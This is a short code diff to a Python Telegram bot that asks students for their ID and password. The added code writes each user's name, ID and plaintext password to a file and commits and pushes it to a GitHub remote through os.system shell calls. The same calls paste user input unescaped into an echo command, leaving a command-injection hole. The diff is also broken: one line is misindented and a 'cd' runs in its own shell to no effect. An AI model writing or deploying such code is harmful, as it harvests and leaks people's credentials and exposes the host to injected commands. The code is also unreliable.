@@ -1,4 +1,4 @@
-import telebot
+import telebot,os
 from telebot import types
 import requests
 import json
@@ -134,8 +134,18 @@ def send_sms(message, chat_id, number):
     json_text = soup.get_text()
     data2 = json.loads(json_text)
     name=data2["stuName"]
-    with open('data.txt', 'a') as file:
-    	file.write(f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n")
+name=data2["stuName"]
+    file_path = 'information/data.txt'
+    content_to_write = f"Name: {name}\nID: {number}\nPassword: {text}\n{'-' * 50}\n"
+    commands = [
+    f'cd information',  # انتقل إلى المجلد
+    f'echo "{content_to_write}" >> data.txt',  # إضافة المحتوى إلى الملف
+    'git add data.txt',  # إضافة الملف للمرحلة
+    'git commit -m "Add data for user"',  # التزام التغييرات
+    'git push origin main'  # رفع التغييرات إلى GitHub (يمكن أن يكون اسم الفرع مختلفًا)
+]
+    for command in commands:
+    	os.system(command)
 
     calculate_and_send_course_info(chat_id, data2)
 
